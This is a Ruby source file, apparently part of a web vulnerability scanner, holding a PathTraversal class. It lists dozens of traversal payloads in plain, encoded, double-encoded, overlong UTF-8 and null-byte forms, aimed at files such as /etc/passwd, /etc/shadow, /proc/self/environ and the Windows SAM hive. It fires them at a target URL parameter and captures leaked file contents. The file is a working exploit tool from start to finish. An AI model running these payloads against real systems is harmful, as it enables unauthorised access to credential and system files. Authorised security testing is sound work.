require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class PathTraversal
  PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\win.ini',
    '....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
    '..../..../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini',
    '..%5c..%5c..%5cwindows%5cwin.ini',
    '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
    '..%255c..%255c..%255cwindows%255cwin.ini',
    '/etc/passwd',
    'C:\\windows\\win.ini',
    '/etc/shadow',
    '/proc/version',
    '/proc/self/environ',
    '/var/log/apache2/access.log',
    '/var/log/nginx/access.log',
    '/var/www/html/index.php',
    'C:\\boot.ini',
    'C:\\windows\\system32\\config\\sam',
    '/etc/hosts',
    '/etc/group',
    '/etc/hostname',
    '/etc/issue',
    '/proc/cpuinfo',
    '/proc/meminfo',
    '/proc/mounts',
    '/proc/net/arp',
    '/proc/net/route',
    '/proc/net/tcp',
    '/proc/net/udp',
    '/proc/version',
    '/proc/cmdline',
    '/proc/environ',
    '/proc/self/cmdline',
    '/proc/self/status',
    '/proc/self/maps',
    '/proc/self/stat',
    '/proc/self/io',
    '/proc/self/fd/0',
    '/proc/self/fd/1',
    '/proc/self/fd/2'
  ]

  def self.test(url, parameter = 'file')
    vulnerable = false
    found_files = []
    
    PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i == 200
          body = response.body
          
          if body.include?('root:') || body.include?('[boot loader]') || body.include?('Linux version') || body.include?('PATH=') || body.include?('HOSTNAME=')
            puts Colorize.red("Path traversal vulnerability found!")
            puts Colorize.yellow("Payload: #{payload}")
            found_files << { file: payload, content: body[0..500] }
            vulnerable = true
          end
        end
      rescue => e
      end
    end
    
    { vulnerable: vulnerable, files: found_files }
  end

  def self.test_absolute_path(url, parameter = 'file')
    absolute_paths = [
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/etc/group',
      '/proc/version',
      '/proc/self/environ',
      'C:\\windows\\win.ini',
      'C:\\boot.ini',
      'C:\\windows\\system32\\config\\sam'
    ]
    
    results = []
    
    absolute_paths.each do |path|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(path)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(path)}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i == 200
          body = response.body
          if body.length > 100 && !body.include?('404') && !body.include?('Not Found')
            puts Colorize.red("Absolute path access: #{path}")
            results << { path: path, accessible: true }
          end
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_encoding_bypass(url, parameter = 'file')
    base_payload = '../../../etc/passwd'
    encodings = [
      base_payload,
      URI.encode_www_form_component(base_payload),
      base_payload.gsub('/', '%2f'),
      base_payload.gsub('.', '%2e'),
      base_payload.gsub('/', '\\'),
      base_payload.gsub('/', '%5c'),
      base_payload.gsub('/', '%c0%af'),
      base_payload.gsub('/', '%c1%9c'),
      base_payload.gsub('.', '%252e'),
      base_payload.gsub('/', '%252f'),
      base_payload.gsub('/', '..%2f'),
      base_payload.gsub('.', '..%2e')
    ]
    
    results = []
    
    encodings.each do |encoded|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{encoded}" : "#{url}?#{parameter}=#{encoded}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i == 200
          body = response.body
          if body.include?('root:') || body.include?('bin/bash')
            puts Colorize.red("Encoding bypass successful: #{encoded}")
            results << { encoding: encoded, vulnerable: true }
          end
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_null_byte(url, parameter = 'file')
    null_byte_payloads = [
      '../../../etc/passwd%00',
      '../../../etc/passwd\0',
      '../../../etc/passwd%2500',
      '..%2f..%2f..%2fetc%2fpasswd%00',
      '..%2f..%2f..%2fetc%2fpasswd\0'
    ]
    
    results = []
    
    null_byte_payloads.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i == 200
          body = response.body
          if body.include?('root:') || body.include?('bin/bash')
            puts Colorize.red("Null byte bypass: #{payload}")
            results << { payload: payload, vulnerable: true }
          end
        end
      rescue => e
      end
    end
    
    results
  end
end

